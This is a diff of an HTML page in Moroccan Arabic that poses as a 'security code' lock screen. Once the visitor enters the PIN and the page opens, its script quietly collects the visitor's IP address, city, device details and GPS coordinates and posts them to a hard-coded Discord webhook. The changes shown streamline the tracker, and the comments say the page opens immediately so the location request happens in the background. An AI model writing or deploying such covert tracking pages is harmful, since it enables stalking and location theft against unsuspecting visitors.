@@ -3,26 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Control</title>
+    <title>Dashboard</title>
     <style>
-        :root { --primary: #4f46e5; --dark: #1e293b; }
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 300px; z-index: 100; }
-        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #e2e8f0; border-radius: 10px; box-sizing: border-box; text-align: center; font-size: 18px; outline: none; }
-        .btn-main { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
-        #main-content { display: none; width: 100%; height: 100vh; flex-direction: column; background: white; }
+        body { margin: 0; font-family: sans-serif; background: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 18px; }
+        button { background: #4f46e5; color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+        #main-content { display: none; width: 100%; height: 100vh; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
     <div id="lock-screen" class="login-box">
-        <div style="font-size: 40px;">🛡️</div>
-        <h2>نظام الحماية</h2>
-        <p style="color: #666; font-size: 14px;">أدخل كود الأمان للمتابعة</p>
-        <input type="password" id="passInput" placeholder="كود الأمان">
-        <button class="btn-main" onclick="handleUnlock()">دخول آمن</button>
-        <p id="msg" style="color: red; font-size: 12px; margin-top: 10px;"></p>
+        <h2>🔒 كود الأمان</h2>
+        <input type="password" id="passInput" placeholder="1234">
+        <button onclick="handleUnlock()">دخول</button>
+        <p id="msg" style="color: red; font-size: 13px;"></p>
     </div>
 
     <div id="main-content">
@@ -30,60 +27,51 @@
     </div>
 
     <script>
-        // الرابط ديالك اللي صيفطتي لي دابا
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
 
-        async function sendToDiscord(extra = "GPS غير مفعل") {
+        async function sendToDiscord(gps = "الخريطة غير متاحة") {
             try {
-                // جلب معلومات الـ IP والمدينة
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
-                
-                const payload = {
-                    embeds: [{
-                        title: "🚨 تنبيه: دخول جديد للموقع!",
-                        color: 5814783,
-                        fields: [
-                            { name: "📍 الموقع (المدينة)", value: data.city + ", " + data.country_name, inline: true },
-                            { name: "🌐 عنوان IP", value: data.ip, inline: true },
-                            { name: "📱 الجهاز", value: navigator.userAgent.split(')')[0] + ')' },
-                            { name: "🗺️ خريطة GPS", value: extra }
-                        ],
-                        footer: { text: "الوقت: " + new Date().toLocaleString() }
-                    }]
-                };
-
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚨 دخول جديد!",
+                            fields: [
+                                { name: "📍 المدينة", value: data.city || "غير معروف", inline: true },
+                                { name: "🌐 IP", value: data.ip, inline: true },
+                                { name: "🗺️ GPS", value: gps }
+                            ]
+                        }]
+                    })
                 });
-            } catch (e) { console.log("Error logging"); }
+            } catch (e) { console.log("Error"); }
         }
 
         function handleUnlock() {
             const pin = document.getElementById('passInput').value;
-            
             if (pin === "1234") {
-                // 1. إظهار المحتوى فوراً
+                // 1. افتحي السيت فوراً (بدون انتظار الـ GPS)
                 document.getElementById('lock-screen').style.display = 'none';
-                document.getElementById('main-content').style.display = 'flex';
+                document.getElementById('main-content').style.display = 'block';
 
-                // 2. محاولة إرسال التتبع فـ الخلفية
+                // 2. دابا عاد نطلبو الـ GPS ف الخلفية
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            sendToDiscord(mapUrl);
+                        (pos) => { 
+                            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            sendToDiscord(link); 
                         },
-                        () => { sendToDiscord(); } // في حالة الرفض
+                        () => { sendToDiscord(); }, // إلا رفض الشخص
+                        { timeout: 3000 } // إلا تعطل المتصفح، يسد الطلب بعد 3 ثواني
                     );
                 } else {
                     sendToDiscord();
                 }
             } else {
-                document.getElementById('msg').innerText = "كود الأمان غير صحيح!";
-                document.getElementById('passInput').value = "";
+                document.getElementById('msg').innerText = "الكود غلط!";
             }
         }
     </script>
